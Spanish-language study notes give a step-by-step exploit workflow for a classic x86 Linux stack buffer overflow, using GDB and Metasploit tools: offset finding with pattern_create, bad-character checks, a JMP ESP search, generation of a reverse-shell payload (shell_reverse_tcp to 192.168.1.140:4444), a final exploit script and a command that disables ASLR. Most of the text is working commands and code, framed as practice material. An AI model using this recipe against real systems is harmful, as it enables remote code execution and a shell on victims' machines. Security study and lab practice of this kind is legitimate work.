
---
Tags: #metasploit #linux #gdb #msfvenom #bufferoverflow

---
## 1. Introducción

Estos apuntes describen una **explotación completa de Buffer Overflow clásico en Linux (x86)** usando:

- GDB (debugger)
    
- Herramientas standalone de Metasploit
    
- msfconsole **solo para generar shellcode**
    

No se utilizan módulos automáticos ni exploits de Metasploit.

---

## 2. Preparación del entorno

### Requisitos

- Binario vulnerable en Linux (ELF)
    
- Sistema sin protecciones o con protecciones conocidas
    
- GDB instalado
    
- Metasploit Framework (para tools y payloads)
    

### Comprobación de protecciones

```bash
checksec --file=./vulnerable
```

Buscar:

- NX: Disabled
    
- PIE: Disabled
    
- Canary: Disabled
    

---

## 3. Creación del pattern (control de EIP)

Usar herramienta de Metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
```

Enviar el pattern como input al binario vulnerable.

Ejemplo:

```bash
echo $(pattern) | ./vulnerable
```

---

## 4. Debug con GDB

```bash
gdb ./vulnerable
run $(pattern)
```

Tras el crash:

```gdb
info registers
eip
```

Ejemplo:

```text
EIP: 0x37694136
```

---

## 5. Cálculo del offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37694136
```

Resultado:

```text
[*] Exact match at offset 524
```

---

## 6. Verificación del offset

Payload de prueba:

```python
payload = b"A"*524 + b"BBBB"
```

Ejecutar:

```bash
gdb ./vulnerable
run $(python3 exploit.py)
```

Si EIP = `0x42424242`, el offset es correcto.

---

## 7. Identificación de Bad Characters

### 7.1 Crear bytearray manual

```python
badchars = bytes([i for i in range(1,256)])
```

Excluir `0x00` inicialmente.

Payload:

```python
payload = b"A"*524 + b"BBBB" + badchars
```

---

### 7.2 Comparación en GDB

Tras el crash:

```gdb
x/200bx $esp
```

Comparar manualmente:

- Bytes que desaparecen
    
- Bytes truncados
    

Iterar hasta lista limpia.

---

## 8. Búsqueda de JMP ESP

### 8.1 Con GDB

```gdb
find &__executable_start,+9999999,0xff,0xe4
```

O usar objdump:

```bash
objdump -d ./vulnerable | grep -E "jmp.*%esp"
```

Ejemplo:

```text
0804843f: jmp *%esp
```

Usar little endian:

```python
eip = b"\x3f\x84\x04\x08"
```

---

## 9. Generación de shellcode con msfconsole

Abrir msfconsole:

```bash
msfconsole
```

Dentro:

```text
use payload/linux/x86/shell_reverse_tcp
set LHOST 192.168.1.140
set LPORT 4444
generate -f python -b "\\x00"
```

Copiar el shellcode.

---

## 10. Estructura del payload final

```text
[ OFFSET ] [ JMP ESP ] [ NOPs ] [ SHELLCODE ]
```

Ejemplo:

```python
payload = b"A"*524 + eip + b"\x90"*32 + shellcode
```

---

## 11. Script final de explotación (ejemplo)

```python
#!/usr/bin/python3
import subprocess

payload = b"A"*524
payload += b"\x3f\x84\x04\x08"
payload += b"\x90"*32
payload += shellcode

print(payload.decode('latin-1'))
```

---

## 12. Resumen mental

1. Crash controlado
    
2. EIP sobrescrito
    
3. Offset exacto
    
4. Badchars identificados
    
5. JMP ESP válido
    
6. Shellcode limpio
    
7. Ejecución de código
    

---

## 13. Notas importantes

- En Linux el análisis de badchars suele ser manual
    
- ASLR debe desactivarse:
    

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

- Preferir binarios sin PIE
    

---

Estos apuntes representan el **flujo real de explotación de Buffer Overflow en Linux usando GDB y herramientas de Metasploit**, listos para estudio y práctica.